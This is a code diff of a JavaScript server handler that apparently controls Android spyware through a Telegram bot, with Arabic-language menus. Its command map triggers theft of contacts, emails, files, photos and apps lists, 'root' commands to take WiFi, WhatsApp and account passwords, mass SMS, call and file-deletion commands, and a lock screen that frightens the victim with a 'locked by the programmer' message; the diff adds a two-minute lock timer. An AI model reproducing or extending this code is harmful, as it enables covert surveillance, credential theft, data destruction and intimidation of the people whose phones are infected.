@@ -16,25 +16,16 @@ for (let i = 1; i <= 50; i++) COMMAND_MAP[`/openapp${i}`] = `open_app:com.androi
 for (let i = 1; i <= 50; i++) COMMAND_MAP[`/del${i}`] = `delete:file${i}.txt`;
 
 const BASE_COMMANDS = {
-  '/fullinfo': 'fullinfo:1', 
-  '/applist': 'applist:1', 
-  '/files': 'files:1',
-  '/killapp': 'killapp:1', 
-  '/sysinfo': 'sysinfo:1', 
-  '/photo': 'take_photo',
-  '/contacts': 'get_contacts:1', 
-  '/root_wifi': 'root_wifi:1',
-  '/root_wa': 'root_whatsapp:1', 
-  '/root_pass': 'root_accounts:1',
-  '/emails': 'get_emails:1'
+  '/fullinfo': 'fullinfo:1', '/applist': 'applist:1', '/files': 'files:1', '/killapp': 'killapp:1',
+  '/sysinfo': 'sysinfo:1', '/photo': 'take_photo', '/contacts': 'get_contacts:1',
+  '/root_wifi': 'root_wifi:1', '/root_wa': 'root_whatsapp:1', '/root_pass': 'root_accounts:1', '/emails': 'get_emails:1'
 };
 
 async function kvCmd(...args) {
   if (!KV_URL || !KV_TOKEN) return null;
   try {
     const r = await fetch(KV_URL, {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
+      method: 'POST', headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
       body: JSON.stringify(args)
     });
     const j = await r.json().catch(() => ({}));
@@ -157,18 +148,16 @@ export default async function handler(req, res) {
         case '/start': case '/menu': 
           await sendToTelegram("👑 أهلاً بك.\nاكتب /help لرؤية الأوامر."); 
           break;
-          
         case '/help': 
           await sendToTelegram(`👑 *لوحة التحكم*\n\n` +
-            `🚨 *أوامر القفل والتخويف:*\n` +
-            `/lock (قفل الهاتف وإظهار رسالة)\n` +
-            `/unlock (فك القفل)\n` +
+            `🚨 *القفل:*\n` +
+            `/lock (قفل الهاتف لمدة دقيقتين)\n` +
+            `/unlock (فك القفل فوراً)\n` +
             `/setmsg <النص> (تغيير رسالة القفل)\n\n` +
-            `👑 *أوامر الروت:*\n` +
+            `👑 *الروت:*\n` +
             `/root_wifi /root_wa /root_pass\n\n` +
             `💥 *الأوامر المولدة:*\n` +
-            `/toast1-100 /url1-100 /vib1-100 /clip1-100\n` +
-            `/sms1-50 /call1-50 /openapp1-50 /del1-50`); 
+            `/toast1-100 /url1-100 /vib1-100 /clip1-100 /sms1-50 /call1-50`); 
           break;
 
         case '/setmsg':
@@ -177,26 +166,22 @@ export default async function handler(req, res) {
             await kvCmd('SET', 'app_lock_msg', newMsg);
             await sendToTelegram(`✅ تم تغيير رسالة القفل إلى:\n"${newMsg}"`);
           } else {
-            await sendToTelegram("⚠️ استعمل: `/setmsg الهاتف مقفل من طرف المبرمج`");
+            await sendToTelegram("⚠️ استعمل: `/setmsg الهاتف مقفل`");
           }
           break;
 
         case '/lock': 
           await kvCmd('SET', 'app_lock_status', 'lock'); 
-          const msgLock = (await kvCmd('GET', 'app_lock_msg')) || '🚨 الهاتف مقفول من طرف المبرمج 🚨';
-          // كنصيفطو الأمر ديال الشاشة مباشرة مع الهزة
-          remoteCommand = `show_lock:${msgLock}`;
-          await sendToTelegram("🔒 [LOCK] تم إرسال أمر القفل للهاتف!"); 
+          const msgLock = (await kvCmd('GET', 'app_lock_msg')) || '🚨 الهاتف مقفل من طرف المبرمج 🚨';
+          // هنا كنصيفطو الوقت 120 ثانية مع الرسالة (120|الرسالة)
+          remoteCommand = `show_lock:120|${msgLock}`;
+          await sendToTelegram("🔒 [LOCK] تم قفل الهاتف لمدة دقيقتين!"); 
           break;
 
         case '/unlock': 
           await kvCmd('SET', 'app_lock_status', 'unlock'); 
           remoteCommand = `killapp:1`; 
-          await sendToTelegram("🔓 [UNLOCK] تم فك القفل."); 
-          break;
-
-        case '/getfile': 
-          if(args[1]) { remoteCommand = `getfile:${args[1]}`; await sendToTelegram(`⏳ [FETCH] ${args[1]}...`); }
+          await sendToTelegram("🔓 [UNLOCK] تم فك القفل فوراً."); 
           break;
 
         default:
